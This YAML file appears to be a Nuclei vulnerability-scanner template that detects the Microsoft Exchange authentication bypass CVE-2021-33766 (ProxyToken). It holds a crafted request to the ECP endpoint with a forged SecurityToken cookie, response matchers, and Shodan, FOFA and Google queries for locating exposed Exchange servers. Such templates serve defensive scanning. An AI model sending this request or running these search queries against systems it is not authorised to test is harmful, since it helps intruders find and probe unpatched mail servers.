http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <span id="msgCode">403</span>
    - function signOut() {
  - condition: and
    part: header
    type: word
    words:
    - Microsoft.Exchange.Data.Storage.ObjectNotFoundException
    - X-BEResource=
  - status:
    - 403
    type: status
  matchers-condition: and
  raw:
  - 'GET /ecp/{{email}}/PersonalSettings/HomePage.aspx?showhelp=false HTTP/1.1

    Host: {{Hostname}}

    Cookie: SecurityToken=x

    '
id: CVE-2021-33766
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:microsoft:exchange_server:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-33766
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cwe-id: NVD-CWE-noinfo
    epss-percentile: 0.99811
    epss-score: 0.93483
  description: 'Microsoft Exchange Server Information Disclosure Vulnerability. This
    vulnerability enables an attacker to bypass authentication and gain access to
    the Exchange Server''s internal.

    '
  impact: 'Unauthenticated attackers can bypass authentication using a SecurityToken
    cookie, gaining access to Exchange Server''s internal API endpoints and sensitive
    information.

    '
  metadata:
    fofa-query:
    - title="outlook"
    - icon_hash=1768726119
    google-query: intitle:"outlook"
    max-request: 1
    product: exchange_server
    shodan-query:
    - vuln:cve-2021-26855
    - http.favicon.hash:1768726119
    - http.title:"outlook"
    - cpe:"cpe:2.3:a:microsoft:exchange_server"
    vendor: microsoft
    verified: true
  name: Microsoft Exchange - Authentication Bypass
  reference:
  - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-33766
  - https://www.zerodayinitiative.com/advisories/ZDI-21-798/
  - https://github.com/demossl/CVE-2021-33766-ProxyToken
  - https://nvd.nist.gov/vuln/detail/CVE-2021-33766
  remediation: 'Apply security updates provided by Microsoft to fix the authentication
    bypass vulnerability.

    '
  severity: high
  tags: cve,cve2021,microsoft,exchange,auth-bypass,kev,vkev,vuln
variables:
  email: '{{randstr}}@{{rand_base(5)}}.com'
